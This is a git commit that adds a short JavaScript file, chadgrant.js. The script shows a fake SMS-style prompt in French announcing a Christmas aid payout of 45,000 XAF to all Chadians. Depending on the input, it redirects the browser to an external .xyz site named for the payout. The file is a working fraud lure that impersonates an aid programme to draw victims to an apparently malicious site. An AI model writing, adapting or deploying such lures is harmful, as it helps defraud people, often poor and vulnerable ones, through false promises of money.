6041d1786c0ee4b821aff76678d9093f4a304f04
newetijazz8 <newetijazz8@gmail.com>
2025-12-08 13:25:30 +0100

    Create chadgrant.js

---
+++ chadgrant.js
@@ -0,0 +1,5 @@
+var password = 'Retirer 45000XAF'
+password=prompt('SMS: Bienvenue à la distribution de l aide financière de Noël de 45 000 XAF à tous les Tchadiens, Cliquez sur OK pour obtenir le vôtre..','Retirer 45000XAF');
+if (password != 'Retirer 45000XAF') {
+location.href='https://www.itinpty.xyz/Retirer-45000XAF';
+}
